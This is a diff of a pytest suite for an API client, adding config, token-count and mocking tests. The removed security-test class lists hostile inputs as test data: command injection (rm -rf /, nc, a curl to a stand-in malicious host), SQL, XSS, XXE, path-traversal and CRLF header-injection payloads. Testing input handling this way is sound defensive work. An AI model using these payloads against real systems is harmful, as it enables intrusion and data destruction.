+    def test_extreme_numeric_values_in_config(self, client):
+        """Test extreme numeric values in model configuration."""
+        config = ModelConfig(name="test-model")
         
-        # Final conversation should be valid
-        assert len(messages) == len(conversation_flow)
+        extreme_values = [
+            # Temperature extremes
+            (lambda c: setattr(c, 'temperature', 0.0), True),
+            (lambda c: setattr(c, 'temperature', 2.0), True),
+            (lambda c: setattr(c, 'temperature', -0.1), False),
+            (lambda c: setattr(c, 'temperature', 2.1), False),
+            
+            # Token extremes
+            (lambda c: setattr(c, 'max_tokens', 1), True),
+            (lambda c: setattr(c, 'max_tokens', 0), False),
+            (lambda c: setattr(c, 'max_tokens', -1), False),
+            
+            # Top-p extremes
+            (lambda c: setattr(c, 'top_p', 0.0), True),
+            (lambda c: setattr(c, 'top_p', 1.0), True),
+            (lambda c: setattr(c, 'top_p', -0.1), False),
+            (lambda c: setattr(c, 'top_p', 1.1), False),
+        ]
+        
+        for setter, should_pass in extreme_values:
+            test_config = ModelConfig(name="test-model")
+            setter(test_config)
+            
+            if should_pass:
+                try:
+                    client._validate_model_config(test_config)
+                except ValidationError:
+                    # Unexpected failure
+                    pytest.fail(f"Validation failed for value that should pass: {test_config.__dict__}")
+            else:
+                with pytest.raises(ValidationError):
+                    client._validate_model_config(test_config)
     
     @pytest.mark.asyncio
-    async def test_model_switching_during_conversation(self, client, sample_messages):
-        """Test switching models during a conversation."""
-        models = ["genesis-gpt-4", "genesis-gpt-3.5-turbo", "genesis-gpt-4"]
-        
-        for i, model_name in enumerate(models):
-            model_config = ModelConfig(name=model_name)
-            
-            mock_response = {
-                'id': f'model-switch-{i}',
-                'model': model_name,
-                'choices': [{'message': {'content': f'Response from {model_name}'}}],
-                'usage': {'total_tokens': 25}
+    async def test_response_with_boundary_token_counts(self, client, sample_messages, sample_model_config):
+        """Test responses with boundary token counts."""
+        boundary_responses = [
+            # Zero tokens
+            {
+                'id': 'zero-tokens',
+                'choices': [{'message': {'content': ''}}],
+                'usage': {'total_tokens': 0, 'prompt_tokens': 0, 'completion_tokens': 0}
+            },
+            # Single token
+            {
+                'id': 'single-token',
+                'choices': [{'message': {'content': 'Hi'}}],
+                'usage': {'total_tokens': 1, 'prompt_tokens': 1, 'completion_tokens': 0}
+            },
+            # Maximum reasonable tokens
+            {
+                'id': 'max-tokens',
+                'choices': [{'message': {'content': 'Large response'}}],
+                'usage': {'total_tokens': 100000, 'prompt_tokens': 50000, 'completion_tokens': 50000}
             }
-            
+        ]
+        
+        for response in boundary_responses:
             with patch('aiohttp.ClientSession.post') as mock_post:
-                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
+                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=response)
                 mock_post.return_value.__aenter__.return_value.status = 200
                 
                 result = await client.create_chat_completion(
                     messages=sample_messages,
-                    model_config=model_config
+                    model_config=sample_model_config
                 )
                 
-                assert result.model == model_name
-                assert f'Response from {model_name}' in result.choices[0].message.content
+                assert result.id == response['id']
+                assert result.usage.total_tokens == response['usage']['total_tokens']
+
+
+class TestAdvancedMocking:
+    """Test advanced mocking scenarios and mock verification."""
     
     @pytest.mark.asyncio
-    async def test_error_recovery_in_conversation(self, client, sample_messages):
-        """Test error recovery during a conversation flow."""
-        # Simulate various error scenarios during conversation
-        error_scenarios = [
-            (500, "Server error occurred"),
-            (429, "Rate limit exceeded"),
-            (503, "Service temporarily unavailable")
+    async def test_mock_call_verification(self, client, sample_messages, sample_model_config):
+        """Test that mocks are called with correct parameters."""
+        mock_response = {
+            'id': 'mock-verification',
+            'choices': [{'message': {'content': 'Test'}}],
+            'usage': {'total_tokens': 5}
+        }
+        
+        with patch('aiohttp.ClientSession.post') as mock_post:
+            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
+            mock_post.return_value.__aenter__.return_value.status = 200
+            
+            await client.create_chat_completion(
+                messages=sample_messages,
+                model_config=sample_model_config
+            )
+            
+            # Verify mock was called correctly
+            assert mock_post.called
+            assert mock_post.call_count == 1
+            
+            # Verify call arguments
+            call_args = mock_post.call_args
+            assert call_args is not None
+            
+            # Should have been called with URL and headers
+            args, kwargs = call_args
+            assert 'json' in kwargs or 'data' in kwargs
+            assert 'headers' in kwargs
+    
+    @pytest.mark.asyncio
+    async def test_side_effect_exhaustion(self, client, sample_messages, sample_model_config):
+        """Test behavior when mock side effects are exhausted."""
+        # Set up mock with limited side effects
+        responses = [
+            Mock(status=200, json=AsyncMock(return_value={'id': 'test1', 'choices': [{'message': {'content': 'One'}}], 'usage': {'total_tokens': 5}})),
+            Mock(status=200, json=AsyncMock(return_value={'id': 'test2', 'choices': [{'message': {'content': 'Two'}}], 'usage': {'total_tokens': 5}}))
         ]
         
-        for status_code, error_message in error_scenarios:
+        with patch('aiohttp.ClientSession.post', side_effect=responses):
+            # First two calls should succeed
+            result1 = await client.create_chat_completion(
+                messages=sample_messages,
+                model_config=sample_model_config
+            )
+            assert result1.id == 'test1'
+            
+            result2 = await client.create_chat_completion(
+                messages=sample_messages,
+                model_config=sample_model_config
+            )
+            assert result2.id == 'test2'
+            
+            # Third call should raise StopIteration or similar
+            with pytest.raises((StopIteration, Exception)):
+                await client.create_chat_completion(
+                    messages=sample_messages,
+                    model_config=sample_model_config
+                )
+    
+    def test_mock_reset_between_tests(self, client):
+        """Test that mocks are properly reset between tests."""
+        # This test should run in isolation
+        with patch('aiohttp.ClientSession.post') as mock_post:
+            # Mock should start fresh
+            assert mock_post.call_count == 0
+            assert not mock_post.called
+            
+            # Configure mock
+            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value={'test': 'data'})
+            mock_post.return_value.__aenter__.return_value.status = 200
+            
+            # Mock should be ready for use
+            assert mock_post.return_value is not None
+    
+    @pytest.mark.asyncio
+    async def test_nested_mock_behavior(self, client, sample_messages, sample_model_config):
+        """Test behavior with nested mocks."""
+        with patch('aiohttp.ClientSession') as mock_session_class:
             with patch('aiohttp.ClientSession.post') as mock_post:
-                mock_post.return_value.__aenter__.return_value.status = status_code
-                mock_post.return_value.__aenter__.return_value.json = AsyncMock(
-                    return_value={'error': {'message': error_message}}
+                # Configure nested mocks
+                mock_session = Mock()
+                mock_session_class.return_value = mock_session
+                
+                mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value={
+                    'id': 'nested-mock',
+                    'choices': [{'message': {'content': 'Nested'}}],
+                    'usage': {'total_tokens': 5}
+                })
+                mock_post.return_value.__aenter__.return_value.status = 200
+                
+                # Should work with nested mocks
+                result = await client.create_chat_completion(
+                    messages=sample_messages,
+                    model_config=sample_model_config
                 )
                 
-                try:
-                    await client.create_chat_completion(
-                        messages=sample_messages,
-                        model_config=ModelConfig(name="genesis-gpt-4")
-                    )
-                    assert False, f"Expected error for status {status_code}"
-                except GenesisAPIError as e:
-                    assert error_message in str(e)
-                    
-                    # Verify client is still functional after error
-                    assert client.session is not None
-                    assert not client.session.closed
+                assert result.id == 'nested-mock'
+                assert mock_post.called
 
 
-class TestAdvancedSecurityScenarios:
-    """Advanced security testing scenarios."""
-    
-    def test_input_sanitization_comprehensive(self, client):
-        """Test comprehensive input sanitization."""
-        malicious_inputs = [
-            # Script injection attempts
-            "<script>alert('xss')</script>",
-            "javascript:alert('xss')",
-            "data:text/html,<script>alert('xss')</script>",
-            
-            # SQL injection attempts
-            "'; DROP TABLE users; --",
-            "1' OR '1'='1",
-            "UNION SELECT * FROM sensitive_data",
-            
-            # Command injection attempts
-            "; rm -rf /",
-            "| nc -l 4444",
-            "$(curl malicious-site.com)",
-            
-            # Path traversal attempts
-            "../../../etc/passwd",
-            "..\\..\\..\\windows\\system32\\config\\sam",
-            
-            # Template injection attempts
-            "{{7*7}}",
-            "${7*7}",
-            "#{7*7}",
-            
-            # LDAP injection attempts
-            ")(cn=*",
-            "*)(&(objectClass=*",
-            
-            # XML injection attempts
-            "<?xml version='1.0'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd' >]><foo>&xxe;</foo>",
-            
-            # Unicode and encoding attacks
-            "%00",
-            "%2e%2e%2f",
-            "\x00\x01\x02",
-            
-            # Long strings (buffer overflow attempts)
-            "A" * 10000,
-            "A" * 100000,
-            
-            # Format string attacks
-            "%n%n%n%n%n",
-            "%x%x%x%x%x",
-            
-            # NoSQL injection attempts
-            "'; return db.users.find(); //",
-            "' || '1'=='1"
-        ]
-        
-        for malicious_input in malicious_inputs:
-            test_message = ChatMessage(role="user", content=malicious_input)
-            
-            try:
-                client._validate_messages([test_message])
-                # If validation passes, ensure the content is handled safely
-                assert test_message.content is not None
-                # The client should not execute or interpret the malicious content
-            except ValidationError:
-                # Acceptable to reject clearly malicious content
-                pass
-    
-    def test_header_injection_prevention_comprehensive(self, client):
-        """Test comprehensive header injection prevention."""
-        malicious_headers = [
-            # HTTP header injection
-            {'X-Custom': 'value\r\nX-Injected: malicious'},
-            {'User-Agent': 'Mozilla/5.0\r\nX-Injected: malicious'},
-            {'Authorization': 'Bearer token\nX-Injected: malicious'},
-            
-            # CRLF injection
-            {'X-Test': 'value\r\n\r\nPOST /malicious HTTP/1.1'},
-            {'X-Test': 'value\n\nGET /admin HTTP/1.1'},
-            
-            # Null byte injection
-            {'X-Test': 'value\x00malicious'},
-            {'X-Test': 'value\x00\x01\x02'},
-            
-            # Unicode control characters
-            {'X-Test': 'value\u0000\u0001\u0002'},
-            {'X-Test': 'value\u200B\u200C\u200D'},
-            
-            # Very long headers
-            {'X-Test': 'A' * 10000},
-            {'X-Test': 'A' * 100000},
-            
-            # Special characters
-            {'X-Test': 'value<script>alert("xss")</script>'},
-            {'X-Test': 'value\'"; DROP TABLE users; --'},
-        ]
-        
-        for headers in malicious_headers:
-            built_headers = client._build_headers(headers)
-            
-            # Verify headers are sanitized
-            for key, value in built_headers.items():
-                assert '\r' not in str(value), f"CRLF found in header {key}: {value}"
-                assert '\n' not in str(value), f"LF found in header {key}: {value}"
-                assert '\x00' not in str(value), f"Null byte found in header {key}: {value}"
-                
-                # Headers should be reasonable length
-                assert len(str(value)) < 50000, f"Header {key} is too long: {len(str(value))}"
-    
-    def test_api_key_security_comprehensive(self, client):
-        """Test comprehensive API key security."""
-        # Test that API key is not exposed in various representations
-        representations = [
-            str(client),
-            repr(client),
-            client.__dict__ if hasattr(client, '__dict__') else {},
-            vars(client) if hasattr(client, '__dict__') else {}
-        ]
-        
-        for representation in representations:
-            representation_str = str(representation)
-            # API key should not appear in string representations
-            assert client.api_key not in representation_str or len(client.api_key) < 5
-        
-        # Test API key validation
-        invalid_keys = [
-            "",
-            "   ",
-            "\n\t\r",
-            None,
-            123,
-            [],
-            {},
-            "key with spaces",
-            "key\nwith\nnewlines",
-            "key\rwith\rcarriage\rreturns",
-            "key\x00with\x00nulls"
-        ]
-        
-        for invalid_key in invalid_keys:
-            with pytest.raises(ValueError, match="API key"):
-                GenesisAPIClient(api_key=invalid_key)
-
-
+# Run the additional tests
 if __name__ == "__main__":
-    # Run all tests including the new comprehensive ones
     pytest.main([
         __file__,
         "-v",
         "--tb=short",
+        "-k", "TestSecurityAndSanitization or TestResourceManagement or TestAdvancedErrorScenarios or TestStateConsistency or TestBoundaryConditions or TestAdvancedMocking",
         "--durations=10"
     ])
